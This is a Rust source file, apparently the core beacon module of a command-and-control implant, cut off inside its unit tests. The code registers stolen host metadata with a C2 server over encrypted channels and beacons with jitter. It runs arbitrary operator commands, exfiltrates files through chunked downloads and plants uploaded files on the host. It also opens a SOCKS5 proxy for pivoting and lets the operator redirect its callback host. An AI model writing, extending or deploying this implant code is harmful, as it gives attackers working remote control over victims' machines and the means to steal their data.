use std::collections::{HashMap, HashSet, VecDeque};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, RwLock};
use std::time::Duration;

use nw_profile::{
    config::GSocketConfig,
    crypto,
    envelope::{Envelope, Kind},
    msgs::{FileAck, PollReply, PollRequest, Register, RegisterAck, Task, TaskResult},
};
use uuid::Uuid;

use crate::download::Download;
use crate::metadata;
use crate::runner;
use crate::transport::Transport;

/// What the implant is configured with before it knows its session id.
#[derive(Clone, Debug)]
pub struct Profile {
    pub endpoint: String,
    pub interval: Duration,
    pub jitter: Duration,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub addr: String,
}

/// Gather machine metadata for the register handshake.
pub fn discover_profile(endpoint: String, interval: Duration, jitter: Duration) -> Profile {
    let host = metadata::discover(&endpoint, interval, jitter);
    Profile {
        endpoint,
        interval,
        jitter,
        hostname: host.hostname,
        username: host.username,
        os: host.os,
        arch: host.arch,
        pid: host.pid,
        addr: host.local_addr.unwrap_or_else(|| "unknown".to_owned()),
    }
}

/// Runtime beacon state shared between the loop and the exit handler.
pub struct BeaconRuntime {
    pub profile: Profile,
    transport: RwLock<Transport>,
    session_id: RwLock<Option<Uuid>>,
    key: RwLock<[u8; crypto::KEY_LEN]>,
    pending: Mutex<Vec<TaskResult>>,
    accepted_task_ids: Mutex<VecDeque<Uuid>>,
    task_states: Mutex<HashMap<Uuid, ActiveTask>>,
    completed: Mutex<BoundedIds>,
    download: RwLock<Option<Download>>,
    upload: RwLock<Option<crate::upload::Upload>>,
    terminal_upload: Mutex<Option<TerminalUpload>>,
    stop: AtomicBool,
}

struct TerminalUpload {
    ack: FileAck,
    task_id: Uuid,
    total: u64,
    dest: String,
}

const TASK_ID_MEMORY_LIMIT: usize = 4096;

#[derive(Default)]
struct BoundedIds {
    order: VecDeque<Uuid>,
    ids: HashSet<Uuid>,
}

enum ActiveTask {
    Accepted,
    Running(tokio::task::AbortHandle),
    Cancelled,
}

impl BoundedIds {
    fn contains(&self, id: &Uuid) -> bool {
        self.ids.contains(id)
    }

    fn insert(&mut self, id: Uuid) -> bool {
        if !self.ids.insert(id) {
            return false;
        }
        self.order.push_back(id);
        while self.order.len() > TASK_ID_MEMORY_LIMIT {
            if let Some(expired) = self.order.pop_front() {
                self.ids.remove(&expired);
            }
        }
        true
    }
}

impl BeaconRuntime {
    pub fn new(profile: Profile, psk: Vec<u8>) -> Self {
        Self::new_with_gsocket(profile, psk, None)
    }

    pub fn new_with_gsocket(
        profile: Profile,
        psk: Vec<u8>,
        gsocket: Option<GSocketConfig>,
    ) -> Self {
        let key = crypto::derive_key(&psk, b"nw-m1-salt");
        let transport = Transport::from_profile(&profile.endpoint, gsocket).unwrap_or_else(|e| {
            tracing::warn!("bad endpoint {:?}: {e}", profile.endpoint);
            Transport::Http {
                client: Default::default(),
                base: profile.endpoint.clone(),
            }
        });
        BeaconRuntime {
            profile,
            transport: RwLock::new(transport),
            session_id: RwLock::new(None),
            key: RwLock::new(key),
            pending: Mutex::new(Vec::new()),
            accepted_task_ids: Mutex::new(VecDeque::new()),
            task_states: Mutex::new(HashMap::new()),
            completed: Mutex::new(BoundedIds::default()),
            download: RwLock::new(None),
            upload: RwLock::new(None),
            terminal_upload: Mutex::new(None),
            stop: AtomicBool::new(false),
        }
    }

    pub fn trigger_stop(&self) {
        self.stop.store(true, Ordering::SeqCst);
    }

    pub fn should_stop(&self) -> bool {
        self.stop.load(Ordering::SeqCst)
    }

    /// Force-kill an in-flight task by task id. Returns true if a child was
    /// terminated. The awaiting runner turns the killed child into a result.
    pub async fn kill_task(&self, task_id: &Uuid) -> bool {
        let mut states = self.task_states.lock().unwrap();
        let killed = match states.get(task_id) {
            Some(ActiveTask::Running(handle)) => {
                handle.abort();
                states.insert(*task_id, ActiveTask::Cancelled);
                true
            }
            Some(ActiveTask::Accepted | ActiveTask::Cancelled) => {
                states.insert(*task_id, ActiveTask::Cancelled);
                true
            }
            None => false,
        };
        drop(states);
        if killed {
            let mut download = self.download.write().unwrap();
            if download
                .as_ref()
                .is_some_and(|candidate| candidate.task_id() == *task_id)
            {
                *download = None;
            }
            drop(download);
            let mut upload = self.upload.write().unwrap();
            if upload
                .as_ref()
                .is_some_and(|candidate| candidate.task_id() == *task_id)
            {
                *upload = None;
            }
            drop(upload);
            let mut terminal = self.terminal_upload.lock().unwrap();
            if terminal
                .as_ref()
                .is_some_and(|candidate| candidate.task_id == *task_id)
            {
                *terminal = None;
            }
        }
        killed
    }

    fn accept_task(&self, task_id: Uuid) -> bool {
        if self.completed.lock().unwrap().contains(&task_id)
            || self
                .pending
                .lock()
                .unwrap()
                .iter()
                .any(|result| result.task_id == task_id)
        {
            return false;
        }
        let mut states = self.task_states.lock().unwrap();
        if states.contains_key(&task_id) || states.len() >= TASK_ID_MEMORY_LIMIT {
            return false;
        }
        states.insert(task_id, ActiveTask::Accepted);
        drop(states);
        self.accepted_task_ids.lock().unwrap().push_back(task_id);
        true
    }

    pub fn set_endpoint(&self, url: String) -> Result<(), String> {
        let t = Transport::from_endpoint(&url)?;
        *self.transport.write().unwrap() = t;
        Ok(())
    }

    fn next_id(&self) -> u64 {
        use std::sync::atomic::AtomicU64;
        static COUNTER: AtomicU64 = AtomicU64::new(1);
        COUNTER.fetch_add(1, Ordering::SeqCst)
    }

    async fn exchange(&self, env: &Envelope) -> Result<Envelope, AnyError> {
        let transport = self.transport.read().unwrap().clone();
        let key = { *self.key.read().unwrap() };
        let sealed = env.seal(&key).map_err(|e| AnyError(e.to_string()))?;
        let raw = transport
            .exchange(sealed.as_bytes())
            .await
            .map_err(AnyError)?;
        let wire = std::str::from_utf8(&raw).map_err(|e| AnyError(e.to_string()))?;
        Envelope::open(&key, wire).map_err(|e| AnyError(e.to_string()))
    }

    /// Register with the C2 and stash the assigned session id.
    async fn register(&self) -> Result<Uuid, AnyError> {
        let id = self.next_id();
        // Roll a fresh ephemeral x25519 key for this registration.
        let kp = crypto::KeyPair::generate();
        let metadata = metadata::discover(
            &self.profile.endpoint,
            self.profile.interval,
            self.profile.jitter,
        );
        let reg = Register {
            hostname: self.profile.hostname.clone(),
            username: self.profile.username.clone(),
            os: self.profile.os.clone(),
            arch: self.profile.arch.clone(),
            pid: self.profile.pid,
            addr: self.profile.addr.clone(),
            os_version: metadata.os_version,
            executable_path: metadata.executable_path,
            local_addr: metadata.local_addr,
            implant_version: Some(metadata.implant_version),
            interval_ms: Some(metadata.interval_ms),
            jitter_ms: Some(metadata.jitter_ms),
            capabilities: Some(metadata.capabilities),
            session_key: encode_key(&kp.public_key()),
        };
        // The register handshake and its ack ride the PSK key; only after
        // deriving the DH session key does the volatile self.key switch over.
        let pt = serde_json::to_vec(&reg).map_err(|e| AnyError(e.to_string()))?;
        let ct =
            crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
        let env = Envelope::new(Kind::Register, id, None, ct);
        let reply = self.exchange(&env).await?;
        if reply.kind != Kind::RegisterAck {
            return Err(AnyError(format!(
                "unexpected register reply kind {:?}",
                reply.kind
            )));
        }
        let ack_pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
            .map_err(|e| AnyError(e.to_string()))?;
        let ack: RegisterAck =
            serde_json::from_slice(&ack_pt).map_err(|e| AnyError(e.to_string()))?;
        // Derive the forward-secret session key from our ephemeral secret and
        // the server's ephemeral public key; every next frame uses this key.
        let server_pub = decode_key(&ack.server_pub).map_err(|e| AnyError(e.to_string()))?;
        let shared = kp
            .shared_secret(&server_pub)
            .map_err(|e| AnyError(e.to_string()))?;
        *self.key.write().unwrap() = crypto::derive_key(&shared, crypto::SESSION_SALT);
        tracing::debug!(session = %ack.session_id, "registered");
        Ok(ack.session_id)
    }

    /// Send buffered results + download chunks; pull new tasks and apply file
    /// acks (resume points).
    async fn poll(&self, sid: Uuid) -> Result<Vec<Task>, AnyError> {
        let id = self.next_id();
        let results = self.pending.lock().unwrap().clone();
        let accepted_task_ids: Vec<Uuid> = self
            .accepted_task_ids
            .lock()
            .unwrap()
            .iter()
            .copied()
            .collect();

        // Stream the active download: hand the transport as many chunks as fit
        // this beacon, up to its per-frame inner budget.
        let file_chunks = {
            let budget = self.transport.read().unwrap().inner_budget();
            let mut dl = self.download.write().unwrap();
            match dl.as_mut() {
                Some(d) => {
                    // Wait for the completion ack before reporting done.
                    d.step(budget)
                }
                None => Vec::new(),
            }
        };

        // Acks for the server->implant upload (reflect last-reply write state).
        let upload_acks = if let Some(terminal) = self.terminal_upload.lock().unwrap().as_ref() {
            vec![terminal.ack]
        } else {
            let up = self.upload.read().unwrap();
            match up.as_ref() {
                Some(u) => vec![u.ack()],
                None => Vec::new(),
            }
        };
        let inner_budget = self.transport.read().unwrap().inner_budget();

        let req = PollRequest {
            results,
            acked_ids: accepted_task_ids.clone(),
            accepted_task_ids: accepted_task_ids.clone(),
            file_chunks,
            upload_acks,
            inner_budget,
        };
        let pt = serde_json::to_vec(&req).map_err(|e| AnyError(e.to_string()))?;
        let ct =
            crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
        let env = Envelope::new(Kind::TaskResult, id, Some(sid), ct);
        let reply = self.exchange(&env).await?;
        let pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
            .map_err(|e| AnyError(e.to_string()))?;
        let pr: PollReply = serde_json::from_slice(&pt).map_err(|e| AnyError(e.to_string()))?;

        // A successfully decoded reply proves the server received this request.
        // Retain newer acceptances queued while the exchange was in flight.
        let sent: HashSet<_> = accepted_task_ids.into_iter().collect();
        self.accepted_task_ids
            .lock()
            .unwrap()
            .retain(|task_id| !sent.contains(task_id));
        if !pr.result_acks.is_empty() {
            let result_acks: HashSet<_> = pr.result_acks.iter().copied().collect();
            self.pending
                .lock()
                .unwrap()
                .retain(|result| !result_acks.contains(&result.task_id));
        }

        // Apply resume acks and finalize the completed download.
        for ack in pr.acks {
            let mut dl = self.download.write().unwrap();
            if let Some(d) = dl.as_mut() {
                if ack.transfer_id == Some(d.transfer_id()) && !ack.done {
                    d.resume_to(ack.received);
                } else if ack.transfer_id == Some(d.transfer_id()) && ack.done {
                    self.pending.lock().unwrap().push(TaskResult {
                        task_id: d.task_id(),
                        ok: true,
                        stdout: format!("downloaded {} bytes of {}", ack.received, d.size)
                            .into_bytes(),
                        stderr: Vec::new(),
                        exit_code: 0,
                    });
                    *dl = None;
                }
            }
            let confirmed = self
                .terminal_upload
                .lock()
                .unwrap()
                .as_ref()
                .is_some_and(|terminal| {
                    ack.transfer_id == terminal.ack.transfer_id
                        && ack.done
                        && ack.received == terminal.total
                });
            if confirmed {
                let terminal = self.terminal_upload.lock().unwrap().take().unwrap();
                if let Some(upload) = self.upload.write().unwrap().take() {
                    if let Err(error) = upload.finalize() {
                        self.pending.lock().unwrap().push(TaskResult {
                            task_id: terminal.task_id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: error.into_bytes(),
                            exit_code: -1,
                        });
                        continue;
                    }
                }
                self.pending.lock().unwrap().push(TaskResult {
                    task_id: terminal.task_id,
                    ok: true,
                    stdout: format!("uploaded {} bytes to {}", terminal.total, terminal.dest)
                        .into_bytes(),
                    stderr: Vec::new(),
                    exit_code: 0,
                });
            } else if ack.done {
                let mut upload = self.upload.write().unwrap();
                if upload
                    .as_ref()
                    .is_some_and(|candidate| ack.transfer_id == Some(candidate.transfer_id()))
                {
                    let upload = upload.take().unwrap();
                    let task_id = upload.task_id();
                    let total = ack.received;
                    let dest = upload.dest.clone();
                    match upload.finalize() {
                        Ok(()) => self.pending.lock().unwrap().push(TaskResult {
                            task_id,
                            ok: true,
                            stdout: format!("uploaded {total} bytes to {dest}").into_bytes(),
                            stderr: Vec::new(),
                            exit_code: 0,
                        }),
                        Err(error) => self.pending.lock().unwrap().push(TaskResult {
                            task_id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: error.into_bytes(),
                            exit_code: -1,
                        }),
                    }
                }
            }
        }

        // Write any server->implant upload chunks; finalize when fully received.
        if !pr.push_chunks.is_empty() {
            let mut up = self.upload.write().unwrap();
            let mut done_meta: Option<(FileAck, Uuid, u64, String)> = None;
            if let Some(u) = up.as_mut() {
                for chunk in &pr.push_chunks {
                    match u.write_chunk(chunk) {
                        Ok(ack) if ack.done => {
                            done_meta = Some((ack, u.task_id(), ack.total, u.dest.clone()));
                            break;
                        }
                        Ok(_) => {}
                        Err(error) => {
                            self.pending.lock().unwrap().push(TaskResult {
                                task_id: u.task_id(),
                                ok: false,
                                stdout: Vec::new(),
                                stderr: error.into_bytes(),
                                exit_code: -1,
                            });
                            *up = None;
                            break;
                        }
                    }
                }
            }
            if let Some((ack, tid, total, dest)) = done_meta {
                *self.terminal_upload.lock().unwrap() = Some(TerminalUpload {
                    ack,
                    task_id: tid,
                    total,
                    dest,
                });
            }
        }
        let mut accepted_now = Vec::new();
        for task in pr.tasks {
            if self.accept_task(task.id) {
                accepted_now.push(task);
            }
        }
        Ok(accepted_now)
    }

    /// Run one returned task, buffering its result for the next poll. Also
    /// handles the implanted local commands (`nw/*`). Sync wrapper; the unit
    /// tests drive this directly, the beacon loop spawns it per task.
    async fn execute(self: Arc<Self>, tasks: Vec<Task>) {
        let mut monitors = Vec::new();
        for task in tasks {
            let task_id = task.id;
            let mut states = self.task_states.lock().unwrap();
            match states.get(&task_id) {
                Some(ActiveTask::Cancelled) => {
                    states.remove(&task_id);
                    drop(states);
                    self.pending.lock().unwrap().push(TaskResult {
                        task_id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"task cancelled".to_vec(),
                        exit_code: -1,
                    });
                    self.completed.lock().unwrap().insert(task_id);
                    continue;
                }
                Some(ActiveTask::Running(_)) => continue,
                Some(ActiveTask::Accepted) => {}
                None if states.len() < TASK_ID_MEMORY_LIMIT => {
                    states.insert(task_id, ActiveTask::Accepted);
                }
                None => continue,
            }
            let runtime = Arc::clone(&self);
            let handle = tokio::spawn(async move { runtime.run_one(&task).await });
            states.insert(task_id, ActiveTask::Running(handle.abort_handle()));
            drop(states);
            let runtime = Arc::clone(&self);
            monitors.push(tokio::spawn(async move {
                if let Err(error) = handle.await {
                    runtime.pending.lock().unwrap().push(TaskResult {
                        task_id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: if error.is_cancelled() {
                            b"task cancelled".to_vec()
                        } else {
                            format!("task join error: {error}").into_bytes()
                        },
                        exit_code: -1,
                    });
                }
                runtime.task_states.lock().unwrap().remove(&task_id);
                runtime.completed.lock().unwrap().insert(task_id);
            }));
        }

        for monitor in monitors {
            let _ = monitor.await;
        }
    }

    /// Run one returned task, buffering its result for the next poll. Also
    /// handles the implanted local commands (`nw/*`).
    async fn run_one(&self, task: &Task) {
        if let Some(result) = crate::modules::execute(task).await {
            self.pending.lock().unwrap().push(result);
            return;
        }
        if let Some(result) = crate::processes::execute(task) {
            self.pending.lock().unwrap().push(result);
            return;
        }
        if let Some(result) = crate::filesystem::execute(task) {
            self.pending.lock().unwrap().push(result);
            return;
        }
        if task.command == "nw/exit" {
            self.trigger_stop();
            return;
        }
        if task.command == "nw/sethost" {
            let result = match task.args.as_slice() {
                [url] => match self.set_endpoint(url.clone()) {
                    Ok(()) => TaskResult {
                        task_id: task.id,
                        ok: true,
                        stdout: format!("callback transport changed to {}", url).into_bytes(),
                        stderr: Vec::new(),
                        exit_code: 0,
                    },
                    Err(e) => TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: format!(
                            "invalid callback URL {url:?}; {e}; expected http(s)://, tcp://, gs://, dns:// with host"
                        )
                        .into_bytes(),
                        exit_code: -1,
                    },
                },
                _ => TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/sethost <base-url>".to_vec(),
                    exit_code: -1,
                },
            };
            self.pending.lock().unwrap().push(result);
            return;
        }
        if task.command == "nw/download" {
            match task.args.as_slice() {
                [path, transfer_id] => {
                    let Ok(transfer_id) = Uuid::parse_str(transfer_id) else {
                        self.pending.lock().unwrap().push(TaskResult {
                            task_id: task.id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: b"invalid download transfer id".to_vec(),
                            exit_code: -1,
                        });
                        return;
                    };
                    let transfer_started = {
                        let mut slot = self.download.write().unwrap();
                        if slot.is_some() {
                            self.pending.lock().unwrap().push(TaskResult {
                                task_id: task.id,
                                ok: false,
                                stdout: Vec::new(),
                                stderr: b"a download is already in progress".to_vec(),
                                exit_code: -1,
                            });
                            false
                        } else {
                            match Download::open(path, transfer_id, task.id) {
                                Ok(d) => {
                                    *slot = Some(d);
                                    true
                                }
                                Err(e) => {
                                    self.pending.lock().unwrap().push(TaskResult {
                                        task_id: task.id,
                                        ok: false,
                                        stdout: Vec::new(),
                                        stderr: e.into_bytes(),
                                        exit_code: -1,
                                    });
                                    false
                                }
                            }
                        }
                    };
                    if transfer_started {
                        self.wait_for_download(task.id).await;
                    }
                }
                _ => self.pending.lock().unwrap().push(TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/download <path> <transfer-id>".to_vec(),
                    exit_code: -1,
                }),
            }
            return;
        }
        if task.command == "nw/upload" {
            match task.args.as_slice() {
                [dest, transfer_id] | [dest, transfer_id, _] | [dest, transfer_id, _, _] => {
                    let Ok(transfer_id) = Uuid::parse_str(transfer_id) else {
                        self.pending.lock().unwrap().push(TaskResult {
                            task_id: task.id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: b"invalid upload transfer id".to_vec(),
                            exit_code: -1,
                        });
                        return;
                    };
                    let transfer_started = {
                        let mut slot = self.upload.write().unwrap();
                        if slot.is_some() {
                            self.pending.lock().unwrap().push(TaskResult {
                                task_id: task.id,
                                ok: false,
                                stdout: Vec::new(),
                                stderr: b"an upload is already in progress".to_vec(),
                                exit_code: -1,
                            });
                            false
                        } else {
                            let expected_total =
                                task.args.get(2).and_then(|value| value.parse().ok());
                            match crate::upload::Upload::open_with_total(
                                dest,
                                transfer_id,
                                task.id,
                                expected_total,
                                task.args.get(3).filter(|value| !value.is_empty()).cloned(),
                            ) {
                                Ok(u) => {
                                    *slot = Some(u);
                                    true
                                }
                                Err(e) => {
                                    self.pending.lock().unwrap().push(TaskResult {
                                        task_id: task.id,
                                        ok: false,
                                        stdout: Vec::new(),
                                        stderr: e.into_bytes(),
                                        exit_code: -1,
                                    });
                                    false
                                }
                            }
                        }
                    };
                    if transfer_started {
                        self.wait_for_upload(task.id).await;
                    }
                }
                _ => self.pending.lock().unwrap().push(TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/upload <dest> <transfer-id>".to_vec(),
                    exit_code: -1,
                }),
            }
            return;
        }
        if task.command == "nw/socks" {
            match task.args.as_slice() {
                [port] => match port.parse::<u16>() {
                    Ok(p) => {
                        let bind = format!("127.0.0.1:{p}");
                        // Bind synchronously so we can report success/failure
                        // to the operator, then run the accept loop detached.
                        match tokio::net::TcpListener::bind(&bind).await {
                            Ok(listener) => {
                                tokio::spawn(async move {
                                    if let Err(e) = crate::socks5::run(listener).await {
                                        tracing::warn!("socks5: {e}");
                                    }
                                });
                                self.pending.lock().unwrap().push(TaskResult {
                                    task_id: task.id,
                                    ok: true,
                                    stdout: format!("socks5 proxy listening on {bind}")
                                        .into_bytes(),
                                    stderr: Vec::new(),
                                    exit_code: 0,
                                });
                            }
                            Err(e) => self.pending.lock().unwrap().push(TaskResult {
                                task_id: task.id,
                                ok: false,
                                stdout: Vec::new(),
                                stderr: format!("socks5 bind {bind}: {e}").into_bytes(),
                                exit_code: -1,
                            }),
                        }
                    }
                    Err(_) => self.pending.lock().unwrap().push(TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/socks <port>".to_vec(),
                        exit_code: -1,
                    }),
                },
                _ => self.pending.lock().unwrap().push(TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/socks <port>".to_vec(),
                    exit_code: -1,
                }),
            }
            return;
        }
        if task.command == "nw/hashes" {
            match task.args.as_slice() {
                [path] => {
                    let result = match tokio::fs::read(path).await {
                        Ok(data) => {
                            use sha2::{Digest, Sha256};
                            let mut h = Sha256::new();
                            h.update(&data);
                            let digest = h.finalize();
                            let hex: String = digest.iter().map(|b| format!("{b:02x}")).collect();
                            TaskResult {
                                task_id: task.id,
                                ok: true,
                                stdout: format!("{hex}  {path}").into_bytes(),
                                stderr: Vec::new(),
                                exit_code: 0,
                            }
                        }
                        Err(e) => TaskResult {
                            task_id: task.id,
                            ok: false,
                            stdout: Vec::new(),
                            stderr: format!("hashes {path}: {e}").into_bytes(),
                            exit_code: -1,
                        },
                    };
                    self.pending.lock().unwrap().push(result);
                }
                _ => self.pending.lock().unwrap().push(TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/hashes <path>".to_vec(),
                    exit_code: -1,
                }),
            }
            return;
        }
        if task.command == "nw/killtask" {
            match task.args.as_slice() {
                [id] => match Uuid::parse_str(id) {
                    Ok(tid) => {
                        let killed = self.kill_task(&tid).await;
                        self.pending.lock().unwrap().push(TaskResult {
                            task_id: task.id,
                            ok: killed,
                            stdout: if killed {
                                format!("killed {tid}").into_bytes()
                            } else {
                                Vec::new()
                            },
                            stderr: if killed {
                                Vec::new()
                            } else {
                                format!("no running task {tid}").into_bytes()
                            },
                            exit_code: if killed { 0 } else { -1 },
                        });
                    }
                    Err(_) => self.pending.lock().unwrap().push(TaskResult {
                        task_id: task.id,
                        ok: false,
                        stdout: Vec::new(),
                        stderr: b"usage: nw/killtask <task-uuid>".to_vec(),
                        exit_code: -1,
                    }),
                },
                _ => self.pending.lock().unwrap().push(TaskResult {
                    task_id: task.id,
                    ok: false,
                    stdout: Vec::new(),
                    stderr: b"usage: nw/killtask <task-uuid>".to_vec(),
                    exit_code: -1,
                }),
            }
            return;
        }
        let result = runner::run(task.clone()).await;
        self.pending.lock().unwrap().push(result);
    }

    async fn wait_for_download(&self, task_id: Uuid) {
        loop {
            let active = self
                .download
                .read()
                .unwrap()
                .as_ref()
                .is_some_and(|download| download.task_id() == task_id);
            if !active {
                return;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    async fn wait_for_upload(&self, task_id: Uuid) {
        loop {
            let active = self
                .upload
                .read()
                .unwrap()
                .as_ref()
                .is_some_and(|upload| upload.task_id() == task_id);
            if !active {
                return;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    fn session_key(&self) -> [u8; crypto::KEY_LEN] {
        *self.key.read().unwrap()
    }

    fn sleep(&self) -> Duration {
        let j = self.profile.jitter.as_millis() as u64;
        let jitter_ms = if j == 0 { 0 } else { rand_jitter(j) };
        Duration::from_millis(self.profile.interval.as_millis() as u64 + jitter_ms)
    }

    /// Own the beacon loop until signalled to stop.
    pub async fn run(self: Arc<Self>) -> anyhow::Result<()> {
        loop {
            if self.should_stop() {
                tracing::info!("implant stop requested");
                break;
            }
            let current = *self.session_id.read().unwrap();
            let sid = match current {
                Some(id) => id,
                None => match self.register().await {
                    Ok(id) => {
                        *self.session_id.write().unwrap() = Some(id);
                        id
                    }
                    Err(e) => {
                        tracing::warn!("register failed: {}", e);
                        tokio::time::sleep(self.sleep()).await;
                        continue;
                    }
                },
            };

            match self.poll(sid).await {
                // Run the batch detached so long-running and short tasks
                // execute concurrently and polling never stalls behind a
                // `sleep`-style in-flight command (cancellation needs the
                // beacon loop to keep polling while a child runs).
                Ok(tasks) => {
                    let rt = Arc::clone(&self);
                    tokio::spawn(async move { rt.execute(tasks).await });
                }
                Err(e) => {
                    tracing::warn!("poll failed: {}", e);
                }
            }
            tokio::time::sleep(self.sleep()).await;
        }
        Ok(())
    }
}

fn encode_key(k: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(k)
}

fn decode_key(s: &str) -> Result<[u8; 32], String> {
    use base64::Engine;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(s)
        .map_err(|e| e.to_string())?;
    <[u8; 32]>::try_from(raw.as_slice()).map_err(|_| "server pub key must be 32 bytes".into())
}

fn rand_jitter(max: u64) -> u64 {
    use rand::Rng;
    rand::thread_rng().gen_range(0..max)
}

#[derive(Debug)]
struct AnyError(String);
impl std::fmt::Display for AnyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}
impl std::error::Error for AnyError {}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(unix)]
    fn long_running_command() -> (String, Vec<String>) {
        ("sh".into(), vec!["-c".into(), "sleep 30".into()])
    }

    #[cfg(windows)]
    fn long_running_command() -> (String, Vec<String>) {
        (
            "cmd.exe".into(),
            vec![
                "/D".into(),
                "/S".into(),
                "/C".into(),
                "ping -n 31 127.0.0.1 > nul".into(),
            ],
        )
    }

    fn runtime() -> BeaconRuntime {
        BeaconRuntime::new(
            Profile {
                endpoint: "http://listener.example:8081".into(),
                interval: Duration::from_secs(1),
                jitter: Duration::ZERO,
                hostname: "test-host".into(),
                username: "test-user".into(),
                os: "test-os".into(),
                arch: "test-arch".into(),
                pid: 1,
                addr: "127.0.0.1".into(),
            },
            b"test-psk".to_vec(),
        )
    }

    #[test]
    fn jittered_sleep_stays_within_the_configured_window() {
        let mut runtime = runtime();
        runtime.profile.interval = Duration::from_millis(100);
        runtime.profile.jitter = Duration::from_millis(50);

        for _ in 0..32 {
            let delay = runtime.sleep();
            assert!(delay >= Duration::from_millis(100));
            assert!(delay < Duration::from_millis(150));
        }
    }

    #[tokio::test]
    async fn completed_task_is_removed_from_cancellation_registry() {
        let runtime = Arc::new(runtime());
        let task = Task {
            id: Uuid::new_v4(),
            command: "printf".into(),
            args: vec!["done".into()],
            timeout_ms: 1_000,
        };
        Arc::clone(&runtime).execute(vec![task.clone()]).await;
        assert!(!runtime.kill_task(&task.id).await);
    }

    #[tokio::test]
    async fn accepted_batch_runs_independently_and_kill_suppresses_queued_work() {
        let runtime = Arc::new(runtime());
        let (command, args) = long_running_command();
        let victim = Task {
            id: Uuid::new_v4(),
            command,
            args,
            timeout_ms: 60_000,
        };
        let kill = Task {
            id: Uuid::new_v4(),
            command: "nw/killtask".into(),
            args: vec![victim.id.to_string()],
            timeout_ms: 10_000,
        };
        assert!(runtime.accept_task(victim.id));
        assert!(runtime.accept_task(kill.id));

        tokio::time::timeout(
            Duration::from_secs(2),
            Arc::clone(&runtime).execute(vec![victim.clone(), kill.clone()]),
        )
        .await
        .expect("kill task must not wait behind the long-running victim");

        let results = runtime.pending.lock().unwrap();
        let victim_result = results
            .iter()
            .find(|result| result.task_id == victim.id)
            .expect("victim cancellation result");
        let kill_result = results
            .iter()
            .find(|result| result.task_id == kill.id)
            .expect("kill control result");
        assert!(!victim_result.ok);
        assert_eq!(victim_result.stderr, b"task cancelled");
        assert!(kill_result.ok);
    }

    #[tokio::test]
    async fn killtask_cancels_an_accepted_task_before_it_is_scheduled() {
        let runtime = Arc::new(runtime());
        let (command, args) = long_running_command();
        let victim = Task {
            id: Uuid::new_v4(),
            command,
            args,
            timeout_ms: 60_000,
        };
        let kill = Task {
            id: Uuid::new_v4(),
            command: "nw/killtask".into(),
            args: vec![victim.id.to_string()],
            timeout_ms: 10_000,
        };
        assert!(runtime.accept_task(victim.id));
        assert!(runtime.accept_task(kill.id));

        Arc::clone(&runtime).execute(vec![kill.clone()]).await;
        tokio::time::timeout(
            Duration::from_secs(1),
            Arc::clone(&runtime).execute(vec![victim.clone()]),
        )
        .await
        .expect("cancelled accepted task must never start");

        let results = runtime.pending.lock().unwrap();
        assert!(
            results
                .iter()
                .any(|result| result.task_id == kill.id && result.ok)
        );
        assert!(results.iter().any(|result| {
            result.task_id == victim.id && !result.ok && result.stderr == b"task cancelled"
        }));
    }

    #[tokio::test]
    async fn killtask_cancels_a_real_upload_slot_and_emits_terminal_result() {
        let runtime = Arc::new(runtime());
        let destination = std::env::temp_dir().join(format!(
            "nw-runtime-cancel-{}-{}.bin",
            std::process::id(),
            Uuid::new_v4()
        ));
        let task = Task {
            id: Uuid::new_v4(),
            command: "nw/upload".into(),
            args: vec![
                destination.to_string_lossy().into_owned(),
                Uuid::new_v4().to_string(),
                "3072".into(),
            ],
            timeout_ms: 60_000,
        };
        assert!(runtime.accept_task(task.id));
        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
        tokio::time::timeout(Duration::from_secs(2), async {
            loop {
                if runtime.upload.read().unwrap().is_some() {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(5)).await;
            }
        })
        .await
        .expect("upload slot must remain registered while transfer is active");
        assert!(runtime.kill_task(&task.id).await);
        tokio::time::timeout(Duration::from_secs(2), runner)
            .await
            .expect("cancelled transfer task must terminate")
            .expect("transfer executor join");
        let results = runtime.pending.lock().unwrap();
        let result = results
            .iter()
            .find(|result| result.task_id == task.id)
            .expect("cancelled transfer result");
        assert!(!result.ok);
        assert_eq!(result.stderr, b"task cancelled");
        let _ = std::fs::remove_file(&destination);
        let _ = std::fs::remove_file(format!("{}.nwpart-{}", destination.display(), task.args[1]));
    }

    #[test]
    fn task_id_tracking_is_bounded() {
        let runtime = runtime();
        let mut accepted = Vec::new();
        for _ in 0..TASK_ID_MEMORY_LIMIT {
            let id = Uuid::new_v4();
            assert!(runtime.accept_task(id));
            accepted.push(id);
        }
        assert!(!runtime.accept_task(Uuid::new_v4()));
        assert_eq!(
            runtime.task_states.lock().unwrap().len(),
            TASK_ID_MEMORY_LIMIT
        );

